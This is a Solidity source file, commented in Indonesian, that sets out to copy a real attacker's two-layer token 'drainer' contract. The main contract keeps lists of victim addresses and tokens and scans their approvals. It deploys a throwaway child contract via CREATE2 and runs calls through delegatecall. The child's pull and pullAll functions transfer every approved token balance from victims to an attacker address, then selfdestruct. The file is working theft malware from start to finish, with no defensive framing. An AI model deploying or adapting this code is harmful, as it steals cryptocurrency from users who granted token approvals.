// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

// ============================================================
// 2-LAYER DRAINER — MIRIP ATTACKER ASLI (0x33aB...4012)
// ============================================================
// Layer 1: DrainerMain — tempat approve (tetap hidup)
// Layer 2: ExploitChild — CREATE2 deploy → drain → selfdestruct
// ============================================================

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transferFrom(address, address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
}

// ============================================
// LAYER 1: DRAINER MAIN — 0x0F7A...0E pattern
// ============================================
contract DrainerMain {
    address public owner;
    mapping(address => bool) public isVictim;
    address[] public victimList;
    mapping(address => bool) public isToken;
    address[] public tokenList;
    
    event VictimAdded(address indexed victim);
    event TokenAdded(address indexed token);
    event Drained(address indexed token, address indexed victim, uint256 amount, address attacker);
    event ExploitDeployed(address indexed exploit, uint256 index);
    
    constructor() {
        owner = msg.sender;
    }
    
    // === ADMIN: Add victims ===
    function addVictims(address[] calldata _victims) external {
        require(msg.sender == owner, "!owner");
        for (uint i = 0; i < _victims.length; i++) {
            if (!isVictim[_victims[i]]) {
                isVictim[_victims[i]] = true;
                victimList.push(_victims[i]);
            }
        }
    }
    
    // === ADMIN: Add tokens ===
    function addTokens(address[] calldata _tokens) external {
        require(msg.sender == owner, "!owner");
        for (uint i = 0; i < _tokens.length; i++) {
            if (!isToken[_tokens[i]]) {
                isToken[_tokens[i]] = true;
                tokenList.push(_tokens[i]);
            }
        }
    }
    
    // === CHECK: Scan semua victim + token → return total drainable ===
    function scan() external view returns (uint256 total, uint256 count) {
        for (uint v = 0; v < victimList.length; v++) {
            address victim = victimList[v];
            for (uint t = 0; t < tokenList.length; t++) {
                address token = tokenList[t];
                uint256 allow = IERC20(token).allowance(victim, address(this));
                if (allow == 0) continue;
                uint256 bal = IERC20(token).balanceOf(victim);
                uint256 amt = allow < bal ? allow : bal;
                if (amt > 0) {
                    total += amt;
                    count++;
                }
            }
        }
    }
    
    // === CREATE2: Deploy exploit child ===
    function deployExploit(bytes32 salt, address attacker) external returns (address) {
        require(msg.sender == owner, "!owner");
        ExploitChild exp = new ExploitChild{salt: salt}(address(this), attacker);
        emit ExploitDeployed(address(exp), salt == bytes32(0) ? 0 : uint256(salt));
        return address(exp);
    }
    
    // === PROXY: DELEGATECALL ke exploit (storage layout matched) ===
    function proxyExec(address exploit, bytes calldata data) external {
        require(msg.sender == owner, "!owner");
        (bool ok, ) = exploit.delegatecall(data);
        require(ok, "proxy failed");
    }
    
    // === KILL: Selfdestruct (kalo butuh) ===
    function kill() external {
        require(msg.sender == owner, "!owner");
        selfdestruct(payable(owner));
    }
    
    // === GETTERS ===
    function victimCount() external view returns (uint) { return victimList.length; }
    function tokenCount() external view returns (uint) { return tokenList.length; }
    function allVictims() external view returns (address[] memory) { return victimList; }
    function allTokens() external view returns (address[] memory) { return tokenList; }
}

// ============================================
// LAYER 2: EXPLOIT CHILD — Selfdestruct
// Storage layout HARUS SAMA dengan DrainerMain
// Slot 0 = owner/drainMain (address)
// ============================================
contract ExploitChild {
    address public owner;       // Slot 0 — matches DrainerMain.owner
    address public attacker;     // Slot 1 — must match
    
    constructor(address _drain, address _attacker) {
        owner = _drain;
        attacker = _attacker;
    }
    
    // === DRAIN 1: Single token + victim list ===
    function pull(address token, address[] calldata victims, address atkAddr) external {
        for (uint i = 0; i < victims.length; i++) {
            address user = victims[i];
            uint256 allow = IERC20(token).allowance(user, address(this));
            if (allow == 0) continue;
            uint256 bal = IERC20(token).balanceOf(user);
            if (bal == 0) continue;
            uint256 amt = allow < bal ? allow : bal;
            bool ok = IERC20(token).transferFrom(user, atkAddr, amt);
            require(ok, "!transfer");
        }
        selfdestruct(payable(atkAddr));
    }
    
    // === DRAIN 2: All tokens from victim list ===
    function pullAll(address[] calldata tokens, address[] calldata victims, address atkAddr) external {
        for (uint t = 0; t < tokens.length; t++) {
            for (uint v = 0; v < victims.length; v++) {
                address user = victims[v];
                address token = tokens[t];
                uint256 allow = IERC20(token).allowance(user, address(this));
                if (allow == 0) continue;
                uint256 bal = IERC20(token).balanceOf(user);
                if (bal == 0) continue;
                uint256 amt = allow < bal ? allow : bal;
                bool ok = IERC20(token).transferFrom(user, atkAddr, amt);
                require(ok, "!transfer");
            }
        }
        selfdestruct(payable(atkAddr));
    }
}
